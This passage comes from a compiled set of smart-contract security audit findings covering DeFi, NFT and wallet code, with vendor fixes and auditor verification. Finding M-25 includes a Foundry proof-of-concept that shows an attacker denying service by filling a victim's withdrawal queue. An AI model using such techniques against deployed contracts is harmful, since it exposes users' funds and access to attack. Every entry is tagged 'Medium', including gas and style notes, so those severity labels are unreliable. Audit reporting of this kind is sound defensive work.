**Description:** `AngstromL2::withdrawProtocolRevenue` first validates whether `unclaimedProtocolRevenueInEther` is sufficient to cover a withdrawal of `amount` by the owner; however, this is not necessary and can be removed as the subsequent decrement would panic revert due to underflow:

```solidity
function withdrawProtocolRevenue(uint160 assetId, address to, uint256 amount) public {
    _checkOwner();

    if (assetId == NATIVE_CURRENCY_ID) {
@>      if (!(amount <= unclaimedProtocolRevenueInEther)) {
            revert AttemptingToWithdrawLPRewards();
        }
@>      unclaimedProtocolRevenueInEther -= amount.toUint128();
    }

    UNI_V4.transfer(to, assetId, amount);
}
```

**Recommended Mitigation:**
```diff
function withdrawProtocolRevenue(uint160 assetId, address to, uint256 amount) public {
    _checkOwner();

    if (assetId == NATIVE_CURRENCY_ID) {
-       if (!(amount <= unclaimedProtocolRevenueInEther)) {
-           revert AttemptingToWithdrawLPRewards();
-       }
        unclaimedProtocolRevenueInEther -= amount.toUint128();
    }

    UNI_V4.transfer(to, assetId, amount);
}
```

**Sorella Labs:** Fixed in commit [ffb9fb2](https://github.com/SorellaLabs/l2-angstrom/commit/ffb9fb20e5b0afbf6996ef9528ef10acd8c94f91#diff-0e68badc81333f3e60fad8069459c6e57e1ac84f433fb40f23cda776b9f9442b).

**Cyfrin:** Verified. The validation along with `unclaimedProtocolRevenueInEther` itself have been removed since revenue paid in the underlying currency is now distinct from rewards accounted by ERC-6909 balance.

## [M-23] Smart contract wallets cannot sign orders due to missing ERC 1271 support
- Severity: `Medium`
- Source report: `clob.md`

### Detailed Content (from source)
**Description:** `MyriadCTFExchange::_validateOrder` uses `ECDSA.tryRecover` exclusively to validate order signatures. This means only EOAs can sign orders — smart contract wallets (Safe multisigs, Argent, ERC-4337 accounts) cannot participate in the CLOB because they cannot produce ECDSA signatures that recover to their contract address.

```solidity
// MyriadCTFExchange.sol:404-406
(address signer, ECDSA.RecoverError recoverError, ) = ECDSA.tryRecover(orderHash, signature);
require(recoverError == ECDSA.RecoverError.NoError, "invalid signature");
require(signer == order.trader, "signer mismatch");
```

**Impact:** All smart contract wallets — including institutional multisigs, DAOs, and account-abstracted wallets — are excluded from trading on the CLOB. This reduces the protocol's addressable market and excludes participants who use smart contract wallets for security best practices.

**Recommended Mitigation:** Use OpenZeppelin's `SignatureChecker.isValidSignatureNow` which transparently handles both ECDSA and ERC-1271:

```solidity
import "@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol";

require(
    SignatureChecker.isValidSignatureNow(order.trader, orderHash, signature),
    "invalid signature"
);
```

**Myriad:** Fixed in commit [`b8bb04b`](https://github.com/Polkamarkets/polkamarkets-js/commit/b8bb04bfe1d7118c13fd077d2b8cb888a0e971dc)

**Cyfrin:** Verified.

## [M-24] eciesjs major version mismatch between d App SDK and mobile wallet creates untested cryptographic interoperability risk
- Severity: `Medium`
- Source report: `connect.md`

### Detailed Content (from source)
**Description:** The dApp SDK `connect-multichain` uses eciesjs **v0.4.16** while MetaMask Mobile uses eciesjs **v0.3.21**. Additionally, `eciesjs v0.3.21` declares a dependency on `secp256k1@^5.0.1`, but a Yarn `resolutions` override in MetaMask Mobile force-pins it to **v4.0.4**, a full major version behind what eciesjs expects.

```
eciesjs@npm:^0.3.15":
  version: 0.3.21
  dependencies:
    futoin-hkdf: "npm:^1.5.3"
    secp256k1: "npm:^5.0.1
```
While the basic API surface overlaps, there are subtle differences in default hash functions, error handling, and constant-time guarantees between v4 and v5.

**Impact:**
- Silent decryption failures or degraded cipher parameters if envelope formats diverge
- Potential subtle cryptographic behavior differences from the `secp256k1` downgrade
- Difficult to reproduce bugs that only surface in `cross-platform` (dApp ↔ wallet) communication

**Recommended Mitigation:**
- Align both sides on the **same** eciesjs major version (preferably 0.4.x)
- Remove or update the `secp256k1` resolution override so eciesjs gets the version it declares
- Add a CI check or integration test that verifies cross-platform encrypt/decrypt round-trips between the dApp SDK and mobile wallet

**Metamsk:**
Fixed in commit [f262f7](https://github.com/MetaMask/metamask-mobile/commit/f262f7c15251aee6f1c1734c28fa60aa4f19e13a).

**Cyfrin:** Verified.

## [M-25] `Shares Cooldown` instant finalization can be Do Sed because of the `Unstake Cooldown` request limits
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** Instant finalization of a `SharesCooldown` position via the `finalizeWithFee` function forces the user to receive `USDe`.
The execution ultimately routes through `strategy.withdraw` with `sender = SharesCooldown` and `receiver = user`. Given that the `token` is `USDe`, this creates an UnstakeCooldown request:

```solidity
unstakeCooldown.transfer(sUSDe, sender, receiver, shares);
```

Inside `UnstakeCooldown.transfer`, the system enforces a strict limit for third-party-initiated transfers:

```solidity
if (initialFrom != to && requestsCount >= PUBLIC_REQUEST_SLOTS_CAP) {
    revert ExternalReceiverRequestLimitReached(...)
}
```

Since `initialFrom = SharesCooldown` and `to = user`, every USDe finalization from SharesCooldown consumes one of the PUBLIC_REQUEST_SLOTS_CAP (40) slots of the user’s `UnstakeCooldown` queue.

However, `SharesCooldown` itself allows up to 70 active requests per user. This mismatch means that up to 30 valid `SharesCooldown` requests may become unfinalizable in USDe, reverting during `unstakeCooldown.transfer` due to the 40-slot cap.

This can be exploited: attacker can create up to 40 small `SharesCooldown` withdraw requests (one per block), wait until they are claimable, and then attempt to `finalize` them in `USDe`. This fills the victim’s `UnstakeCooldown` queue. For the duration of the `sUSDe` unstake delay (e.g., 8 hours), all instant finalizations during this period will revert (`finalizeWithFee`), given that the asset to be redeemed is automatically selected as `USDe`.

**Impact:** Instant finalizations via `finalizeWithFee` are susceptible to this DoS, forcing users to wait until the unstake delay of the withdrawal requests on the `UnstakeCooldown` queue to be over.

**Proof of Concept:** paste to new file in `PoC/cyfrin`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";
import {SharesCooldown} from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {AccessControlled} from "../../../contracts/governance/AccessControlled.sol";
import {ISharesCooldown} from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { CooldownBase } from "../../../contracts/tranches/base/cooldown/CooldownBase.sol";

contract JrtSrtRatioViolationTest is CDOTest {

    function test_PoC_DoS() public {
        address victim = address(0x1234);
        address attacker = address(0x5678);
        address owner = cdo.owner();
        vm.startPrank(owner);
        SharesCooldown sharesCooldown = SharesCooldown(
            address(
                new ERC1967Proxy(
                    address(new SharesCooldown()),
                    abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
                )
            )
        );
        AccessControlled(sharesCooldown).setTwoStepConfigManager(owner);
        acm.grantRole(keccak256("COOLDOWN_WORKER_ROLE"), address(cdo));
        // 2. Register sharesCooldown in CDO
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));


        // Set up real spec exit bands per reference
        SharesCooldown.TExitUpperBounds memory jrtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 100000,     // 0.5% (in ppm)
            p1: 150000,    // 2.3% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 2 days }),   // 1% fee + 2 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 5000, sharesLock: 8 hours }),   // 0.5% fee + 8h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 300, sharesLock: 0 })           // 0.03% fee, no lock
        });
        SharesCooldown.TExitUpperBounds memory srtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 20000,     // 2% (in ppm)
            p1: 400000,    // 40% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 3 days }),   // 1% fee + 3 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 7000, sharesLock: 7 hours }),   // 0.7% fee + 7h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 1500, sharesLock: 0 })          // 0.15% fee, no lock
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), jrtExitBounds);
        sharesCooldown.setVaultExitBounds(address(srtVault), srtExitBounds);

        // Victim deposits to JRT and requests withdrawal (finalizable with fee)
        uint256 victimDeposit = 1100 ether;
        vm.startPrank(victim);
        USDe.mint(victim, victimDeposit);
        USDe.approve(address(jrtVault), 100 ether);
        USDe.approve(address(srtVault), 1000 ether);
        jrtVault.deposit(100 ether, victim);
        srtVault.deposit(1000 ether, victim);
        vm.stopPrank();

        // Victim requests to withdraw 40 shares from JRT (creates withdrawal request)
        uint256 withdrawAmount = 40 ether;
        vm.startPrank(victim);
        jrtVault.withdraw(withdrawAmount, victim, victim);
        vm.stopPrank();

        skip(1 hours);
        // Attacker creates 40 minimal withdrawals on behalf of the victim, inflating activeRequests array
        vm.prank(owner);
        cdo.setSharesCooldown(ISharesCooldown(address(0))); // disable shares cooldown for example
        vm.startPrank(attacker);
        USDe.mint(attacker, 1 ether);
        USDe.approve(address(jrtVault), 1 ether);
        jrtVault.deposit(1 ether, attacker);
        uint256 attackerMinWithdrawal = 1;
        for (uint256 i = 0; i < 40; ++i) {
            skip(1);
            jrtVault.withdraw(attackerMinWithdrawal, victim, attacker);
        }
        vm.stopPrank();

        vm.startPrank(owner);
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown))); // return back
        sharesCooldown.setVaultEarlyExitFee(address(jrtVault), 0.001 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        vm.expectRevert();
        sharesCooldown.finalizeWithFee(jrtVault, victim, 0);
        vm.stopPrank();
    }
}
```

**Recommended Mitigation:** `finalizeWithFee` should allow the user to select the asset to receive.
- Allowing the `user` to select what asset to receive would completely remove the incentive of attempting to cause the DoS, given that the DoS can be bypassed by simply selecting `sUSDe` as the asset to receive for an instant withdrawal.

**Strata:** Fixed in commit [ebd4376](https://github.com/Strata-Money/contracts-tranches/commit/ebd4376019936cfc080ad7a06c8fec1d2ba324a9).

**Cyfrin:** Verified. Users are now able to select the `token` to receive when instantly finalizing requests on the `SharesCooldown`

## [M-26] `Tranche::max Withdraw` can understate the max withdrawal for the `Shares Cooldown` contract
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** When the owner is `SharesCooldown`, the CDO explicitly exempts it from exit fees / lockups:
```solidity
if (owner == address(sharesCooldown)) {
    return (TExitMode.ERC4626, 0, 0);
}
```

But `Tranche.maxWithdraw(owner)` derives `assetsNet` using `previewRedeem(sharesGross)`, and `previewRedeem` hardcodes `address(0)` as the owner when it queries exit conditions:

```solidity
function maxWithdraw(address owner) public view returns (uint256 assetsNet) {
    uint256 sharesGross = balanceOf(owner);
    assetsNet = Math.min(previewRedeem(sharesGross), cdo.maxWithdraw(address(this), owner));
}

function previewRedeem(uint256 sharesGross) public view returns (uint256 assetsNet) {
    (, uint256 fee,) = cdo.calculateExitMode(address(this), address(0));
    assetsNet = quoteRedeem(sharesGross, fee);
}
```

As a result, `maxWithdraw(address(sharesCooldown))` can be understated because `previewRedeem` may include an exit fee that does not apply to `SharesCooldown`.

**Recommended Mitigation:** In `maxWithdraw(owner)` take into account `SharesCooldown`

Alternatively, given that `SharesCooldown` only interacts with the redemption execution path (`Tranche::redeem`), consider documenting that `Tranche::maxWithdraw`, as well as `Tranche::previewRedeem` functions don't discount the fees exemption applied for the `SharesCooldown` contract.

**Strata:** Fixed in commit [4b49a00](https://github.com/Strata-Money/contracts-tranches/commit/4b49a00c772df2dbf66e0c2982d50ab2633c0fe2).

**Cyfrin:** Verified. `Tranche::maxWithdraw` and `Tranche::previewRedeem` inline comments now state that these functions are for public usage.

## [M-27] Allowance-Based Withdrawals Can Revert Due to Cooldown Request Slot Limits
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** The tranche withdraw/redeem logic allows third parties to withdraw on behalf of a user via allowance:
```solidity
if (caller != owner) {
    _spendAllowance(owner, caller, sharesGross);
}
```
When such a withdrawal is executed using `SharesLock` exit mode, the shares are transferred into the cooldown system and a redeem request is created via `requestRedeem`.

Inside `requestRedeem`, cooldown requests are rate-limited for external receivers:
```solidity
if (initialFrom != to && requestsCount >= PUBLIC_REQUEST_SLOTS_CAP) {
    revert ExternalReceiverRequestLimitReached(...);
}
```
This condition treats any case where `initialFrom != to` as an external receiver, including scenarios where a trusted third party withdraws via allowance and sets `to = caller`. As a result, legitimate allowance-based `withdrawals` can unexpectedly hit the public request slot cap and revert.

This behavior is non-obvious and not enforced at the allowance-checking level, creating an implicit constraint on delegated withdrawals that integrators and users are unlikely to anticipate.

**Impact:** Allowance-based withdrawals using SharesLock can unexpectedly revert due to cooldown request slot limits, breaking integrations and delegated workflows.

**Recommended Mitigation:** Explicitly account for allowance-based withdrawals in cooldown request validation, or clearly document this limitation and its implications for delegated withdrawals.

**Strata:** Fixed in commit [6a9d7a7](https://github.com/Strata-Money/contracts-tranches/commit/6a9d7a7ace616a115a62245b463f6abf89d1ca5f).

**Cyfrin:** Verified. Now, when the `receiver` is either the `caller` or the `owner`, `initialFrom` is set as the `receiver`, which treats the withdrawal request as a `Private Request` and does not count toward the `Public Limit Cap`.

## [M-28] APR Targets are not updated when withdrawal requests are sent to the `Shares Cooldown` to reflect the change on NAVs caused by the charged fees for the withdrawal
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** The execution path for processing a withdrawal request sent to the `SharesCooldown` charges fees based on the total Tranche Shares redeemed. These fees are charged in the form of burning tranche shares and updating the Tranche NAV and `reserveNav` accordingly.
- `SharesCooldown::requestRedeem` => `SharesCooldown::accrueFee` => `Tranche::burnSharesAsFee` => `CDO::accrueFee` => `Accounting::accrueFee`

The problem is that the APR Targets for the Tranches are not recalculated to reflect the changes to the NAVs, which means the system will use outdated APR targets until a new operation is performed that updates the APRs.
```solidity

//Tranche::burnSharesAsFee//
    function burnSharesAsFee(uint256 shares, address owner) external returns (uint256 assets) {
        ...
        cdo.accrueFee(address(this), assets);
    }

//CDO::accrueFee//
    function accrueFee (address tranche, uint256 assets) external onlyTranche {
        accounting.accrueFee(isJrt(tranche), assets);
    }

//Accounting::accrueFee//
    function accrueFee (bool isJrt, uint256 amount) external onlyCDO {
        ...

 //@audit-issue => navs are modified, but the APRs are not updated!

        reserveNav += amountToReserve;
        if (isJrt) {
            jrtNav -= amountToReserve;
        } else {
            srtNav -= amountToReserve;
        }
        emit FeeAccrued(isJrt, amountToReserve, amount - amountToReserve);
    }
```

**Impact:** Outdated APR targets, especially outdated and higher than actual APR Targets for the SR Tranche, will cause the JRs to earn less interest than they should.

**Recommended Mitigation:** Consider refactoring the `Accounting::accrueFee` function to update the APR Target, similar to how the `Accounting::updateBalanceFlow` does.

**Strata:** Fixed in commit [b11016c](https://github.com/Strata-Money/contracts-tranches/commit/b11016c052b9b2a89a60ed6c4502c8bd94fbbea8).

**Cyfrin:** Verified. `Tranche::burnSharesAsFee` now extends the full accounting flow, updating APRs as needed.

## [M-29] Finalizing withdrawal requests on the `Shares Cooldown` contract allows for third-parties to override user’s chosen output token
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** During `Tranche::withdraw/redeem`, the user can select the desired output token. However, when the exit mode is `SharesLock`, the final token received by the user is no longer under the user's control.

- SharesCooldown finalization is permissionless, allowing any caller to choose the output token at finalization time. This enables third parties to finalize the user’s claim using a different token than the one the user originally intended.
```solidity
    function finalize(ITranche vault, address token, address user) external returns (uint256 claimed) {
        return finalize(vault, token, user, block.timestamp);
    }
    function finalize(ITranche vault, address token, address user, uint256 at) public returns (uint256 claimed) {
        claimed = extractClaimableInner(address(vault), user, at);
        vault.redeem(token, claimed, user, address(this));
        emit Finalized(vault, user, claimed);
        return claimed;
    }
```

This is problematic because the final time it takes for the withdrawers to receive the assets can be extended beyond what they are comfortable waiting for. For example, consider the scenario where a user selects `sUSDe` as the `outputToken`. Here is what would happen when finalizing such a withdrawal request on the `SharesCooldown` contract:
1. If finalization selects `sUSDe`, then the `cooldown` period was the only time the user had to wait to receive his assets.
2. If finalization selects `USDe`, then, on top of the `cooldown` period, the user will have to wait for the `unstaking` period on the `sUSDe` contract, and, only until the `unstaking` period is over, the user will be able to get their assets back finally.


**Recommended Mitigation:** Persist the user’s chosen output token when creating the cooldown request and enforce it during a permissionless finalization.

**Strata:** Fixed in commit [0354983](https://github.com/Strata-Money/contracts-tranches/commit/03549831cf5912b15d9a0eac2bdcfae7e1c395d8).

**Cyfrin:** Verified. Permissionless finalizations can't override the user's original choice; only the user can override the redeemable token via a permissioned function. Now it is possible to finalize only requests for a specific token at a time.

## [M-30] Misleading owner field in On Meta Withdraw event
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** `OnMetaWithdraw` event emit receiver as the first argument, while the parameter is named owner. Since owner, caller, and receiver can differ, this semantic mismatch may mislead off-chain indexers

**Recommended Mitigation:** Rename the event parameter to receiver, or include both owner and receiver explicitly

**Strata:** Fixed in commit [1021020](https://github.com/Strata-Money/contracts-tranches/commit/1021020ab866177f8570aa28494f0f7a03a1b091).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization

## [M-31] Skip call to `CDO::accrue Fee` when there are no fees to charge
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** During a withdrawal/redemption, when the `TExitMode` is != than `SharesLock`, `CDO::accrueFees` is called to charge any fees that may have to be paid for the withdrawal, but there are multiple cases when no fees are charged (i.e., when finalizing a withdrawal from the `SharesCooldown`.
```solidity
    function _withdraw(
        ...
    ) internal virtual {
       ...

        if (exitMode == IStrataCDO.TExitMode.SharesLock) {
            ...
        }

        uint256 baseAssetsGross = convertToAssets(sharesGross);
        uint256 fee = Math.saturatingSub(baseAssetsGross, baseAssets);

        _burn(owner, sharesGross);
//@audit => No need to call cdo.accrueFee when no fees will be charged
@>      cdo.accrueFee(address(this), fee);
        ...
    }

```


**Recommended Mitigation:** In the scenarios where no fees will be charged, it is not necessary to call `CDO::accrueFees`.

**Strata:** Fixed in commit [b690dcd](https://github.com/Strata-Money/contracts-tranches/commit/b690dcde46a41553ac5d44810367e7c222bc6082).

**Cyfrin:** Verified.

## [M-32] Overpayment vulnerability in `register L1`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `registerL1` function in the `L1Registry` contract does not handle excess Ether sent by users. If the `registerFee` is set to a nonzero value and a user sends more Ether than required, the contract keeps the entire amount instead of refunding the excess. If the `registerFee` is set to zero and a user sends Ether, that Ether becomes trapped in the contract with no way for the user to recover it, as there is no refund logic or withdrawal path for arbitrary senders.

**Impact:** Users can unintentionally lose funds by sending more Ether than required for registration. In the case where `registerFee` is zero, any Ether sent is permanently locked in the contract, as only the fee collector can withdraw accumulated fees, and only if they were tracked as unclaimed fees. This can lead to user frustration and loss of funds due to simple mistakes or misunderstandings about the required payment.

**Recommended Mitigation:** Implement logic in the `registerL1` function to refund any excess Ether sent above the required `registerFee`. For example, after transferring the required fee to the collector, track any remaining balance for the sender. Additionally, if `registerFee` is zero, revert the transaction if any Ether is sent, preventing accidental loss of funds.

**Suzaku:**
Fixed in commit [1c4cfe6](https://github.com/suzaku-network/suzaku-core/pull/155/commits/1c4cfe6a785287263b83f6c877678ba779abb3fb).

**Cyfrin:** Verified.

\clearpage

## [M-33] Unnecessary `only Registered Operator Node` on `complete Stake Update` function
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** `completeStakeUpdate` is calling internal function `_completeStakeUpdate` which has the same modifier applied. Currently the modifier `onlyRegisteredOperatorNode` is checked twice.


**Recommended Mitigation:** Consider removing `onlyRegisteredOperatorNode` on `_completeStakeUpdate`

**Suzaku:**
Fixed in commit [f9946ef](https://github.com/suzaku-network/suzaku-core/commit/f9946ef8f6c7d7ab946e01d906f411352004ee41).

**Cyfrin:** Verified.

## [M-34] `burn` should delete `token URI` related data and emit `Token Uri Unpinned` event
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** The `burn` function should delete `tokenURI` related data and emit `TokenUriUnpinned` event:
```diff
    function burn(uint256 tokenId) public override whenNotPaused {
        // require sender is owner or approved has been removed as the internal burn function already checks this
        ERC2981Upgradeable._resetTokenRoyalty(tokenId);
        ERC721BurnableUpgradeable.burn(tokenId);
        emit Burned(tokenId);
+       emit TokenUriUnpinned(tokenId);
+       delete _tokenURIs[tokenId];
+       delete _pinnedURIIndex[tokenId];
+       delete _hasPinnedTokenURI[tokenId];
    }
```

This provides a gas refund as part of the burn and also removes token data that should no longer exist. It also prevents `hasPinnedTokenURI` from returning `true` for a burned token since that function doesn't check for valid token id (another issue has been created to track this).

**CryptoArt:**
Fixed in commit [b554763](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/b5547630515c8da112db6754a3e25dda1e69b4a7).

**Cyfrin:** Verified.

## [M-35] Collector can add `Creator Story`, corrupting the provenance of an artwork
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** The purpose of the `IStory` interface is to allow 3 different entities (Admin, Creator and Collectors) to add "Stories" about a given artwork (NFT) which [describes the provenance of the artwork](https://docs.transientlabs.xyz/tl-creator-contracts/common-features/story-inscriptions). In the art world the "provenance" of an item can affect its status and price, so the `IStory` interface aims to facilitate an on-chain record of an artwork's "provenance".

`IStory` is designed to work like this:
* Creator/Admin can add a `CollectionsStory` for when a collection is added to a contract
* Creator of an artwork can add a `CreatorStory`
* Collector of an artwork can add one or more `Story` about their experience while holding the artwork

The `IStory` interface specification requires that `addCreatorStory` is only called by the creator:
```solidity
/// @notice Function to let the creator add a story to any token they have created
/// @dev This function MUST implement logic to restrict access to only the creator
function addCreatorStory(uint256 tokenId, string calldata creatorName, string calldata story) external;
```

But in the CryptoArt implementation of the `IStory` interface, the current token owner can always emit `CreatorStory` events:
```solidity
function addCreatorStory(uint256 tokenId, string calldata, /*creatorName*/ string calldata story)
    external
    onlyTokenOwner(tokenId)
{
    emit CreatorStory(tokenId, msg.sender, msg.sender.toHexString(), story);
}
```

**Impact:** As an NFT is sold or transferred to new owners, each subsequent owner can continue to add new `CreatorStory` events even though they aren't the Creator of the artwork. This corrupts the provenance of the artwork by allowing Collectors to add to the `CreatorStory` as if they were the Creator.

**Recommended Mitigation:** Only the Creator of an artwork should be able to emit the `CreatorStory` event. Currently the on-chain protocol does not record the address of the creator; this could either be added or `onlyOwner` could be used where the contract owner acts as a proxy for the creator.

**CryptoArt:**
Fixed in commit [94bfc1b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/94bfc1b1454e783ef1fb9627cfaf0328ebe17b47#diff-1c61f2d0e364fa26a4245d1033cdf73f09117fbee360a672a3cb98bc0eef02adL439-R439).

**Cyfrin:** Verified.

\clearpage

## [M-36] Prefer named return parameters, especially for `memory` returns
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** Prefer named return parameters, especially for memory returns. For example `tokenURIs` can be refactored to remove local variables and explicit return:
```solidity
function tokenURIs(uint256 tokenId)
    external
    view
    override
    onlyIfTokenExists(tokenId)
    returns (uint256 index, string[2] memory uris, bool isPinned)
{
    index = _getTokenURIIndex(tokenId);
    uris = _tokenURIs[tokenId];
    isPinned = _hasPinnedTokenURI[tokenId];
}
```

**CryptoArt:**
Fixed in commit [bdd28fa](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/bdd28fa71f8d445fb3306a1fdc16b49fa5b5d1e4).

**Cyfrin:** Verified.

## [M-37] Remove obsolete `only Token Owner` from `_transfer To Nft Receiver`
- Severity: `Medium`
- Source report: `cryptoart.md`

### Detailed Content (from source)
**Description:** Since `_transferToNftReceiver` calls `ERC721Upgradeable::safeTransferFrom`, the `onlyTokenOwner` modifier is obsolete and inefficient as:
* `safeTransferFrom` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L183) `transferFrom`
* `transferFrom` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L166) `_update` passing `_msgSender()` as the last `auth` parameter
* `_update` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L274) `_checkAuthorized` since the `auth` parameter was valid
* `_checkAuthorized` [calls](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/release-v5.1/contracts/token/ERC721/ERC721Upgradeable.sol#L215-L238) `_isAuthorized` which verifies the caller is either the token's owner or someone who the token owner has approved

**CryptoArt:**
Fixed in commit [75e179b](https://github.com/cryptoartcom/cryptoart-smart-contracts/commit/75e179b3cea8855977a391ace169313053bc2de5).

**Cyfrin:** Verified.

## [M-38] Incorrect `chainid` prevents correct Strategy deployment on Berachain
- Severity: `Medium`
- Source report: `d2.md`

### Detailed Content (from source)
**Description:** The Strategy contract includes a special configuration specifying which facets should be used for different chains. However, the `chainid` assigned to Berachain is incorrect, as seen in  [`Strategy::constructor`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/Strategy.sol#L25-L337), [L216](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/Strategy.sol#L216):
```solidity
} else if (block.chainid == 80000) { // @audit Berachain id is 80094
```
According to the [official documentation](https://docs.berachain.com/developers/network-configurations), the correct `chainid` for Berachain is `80094`, not `80000`.

**Impact:** Facets intended for deployment on Berachain will not be correctly initialized until a new Strategy contract is deployed with the corrected `chainid`. This prevents the expected functionality from being executed on Berachain.

**Recommended Mitigation:** Consider changing `chainid` to `80094`:
```diff
- } else if (block.chainid == 80000) {
+ } else if (block.chainid == 80094) {
```

**D2:** Fixed in commit [`ab5b852`](https://github.com/d2sd2s/d2-contracts/commit/ab5b85264dd7fcacc4afc5e146427428b3f6f719)

**Cyfrin:** Verified.

## [M-39] `Client Community State::update` function does not update the `rate` before calculating new `dividends_value`
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `ClientCommunityState::update` function is responsible for distributing dividends based on the amount of DRVS tokens a user holds:
```rust
for (i, d) in self.data.iter_mut().enumerate() {
    let amount = (((community_state.base_crncy[i].rate - d.dividends_rate)
        * self.header.drvs_tokens as f64) as i64)
        .max(0);
    d.dividends_value += amount;
}
```
The value of `community_state.base_crncy[i].rate` is updated every hour through the dividend allocation function.

However, there is a possibility that more than one hour has passed since the last allocation and dividend allocation function is not called and our current implementation does not update the `rate` in such cases. As a result, the calculation may rely on stale `rate`, and `dividends_value` may be computed using a stale `community_state.base_crncy[i].rate`.

Scenario:
1. One hour has just passed, but the dividend allocation function is not called.
2. The user calls withdraw to withdraw DRVS tokens, which also does not update the rates.
3. As a result, the user receives a lower dividend value because the calculation is based on an outdated rate.

The scenario described above involves the withdraw functionality, but a similar issue can occur with deposit as well:
1. One hour has just passed, but the dividend allocation function is not called.
2. A user purchases DRVS tokens and calls deposit. However, we record the old rate as the user’s `dividends_rate`.
3. The user can then call the dividend allocation function and receive dividends that they should not be entitled to, because they did not hold those DRVS tokens during the previous hour.

**Impact:** If the dividend allocation function is not called before update, and more than one hour has passed, it can result in some users unfairly incurring losses while others receive undeserved profits.

**Recommended Mitigation:** Update `community_state.base_crncy[i].rate` if one hour has passed before updating `dividends_value` and `dividends_rate`.

**Deriverse:** Fixed in commit [ca593e](https://github.com/deriverse/protocol-v1/commit/ca593e2bc30b93a7a4a53c69ceb5b91a282c8955).

**Cyfrin:** Verified.

## [M-40] `get_current_leverage` calculates leverage incorrectly for long positions
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** When calculating the margin, we use `(-(info.funds.min(perp_value as i64))).max(0)`, In a long position, the user’s funds become negative, while in a short position, the `perp_value` becomes negative.

However, when computing leverage, we use `position_size / value`. For long positions, the user’s funds effectively equal the initial funds used to open the position minus the position size, which leads to an incorrect leverage calculation.

Scenerio:
A user with 10,000 USDC in funds who wants to open a 10× long position on Bitcoin, priced at 100,000 USDC.
The user uses the 10,000 USDC as margin and enters a long position of 1 BTC. After the purchase, the user’s funds become –90,000 USDC, and their perpetual position equals 1 BTC.

However, when calculating the current leverage, the function returns 9× instead of 10× because it computes the leverage as follows: `max(-min(-90000, 100000), 0) / 10,000`

**Impact:** This does not have any practical impact because the old and new leverage values are compared in `check_client_leverage_shift`. The logic still holds, as an increase in leverage always results in a higher new leverage, so no issues arise currently.

**Recommended Mitigation:** We should use `perp_value` when calculating the current leverage.


**Deriverse:** Fixed in commit [e4c0a6](https://github.com/deriverse/protocol-v1/commit/e4c0a6fbc8ea72190df0b9e7df16e3db09d99a71).

**Cyfrin:** Verified.

## [M-41] Decimal Mismatch in Fee Prepayment Accounting Causes Incorrect Balance Tracking
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** There is a critical decimal mismatch between how fee prepayment is stored and withdrawn. In `fees_deposit`, the `fees_prepayment` field stores the raw `data.amount` value (in token's native decimal units), but in `fees_withdraw`, it subtracts `data.amount / dec_factor` (in human-readable units).

This causes severe accounting errors where the stored prepayment balance becomes incorrect after withdrawals, and also leads to incorrect off-chain event logging.

The issue occurs due to inconsistent unit handling:

In `fee_deposit`:
```rust
let prepayment = data.amount as f64 / dec_factor;
...
client_community_state.data[crncy_index].fees_prepayment += data.amount;  // Stores raw value
...
client_state.sub_crncy_tokens(data.amount)?;
```

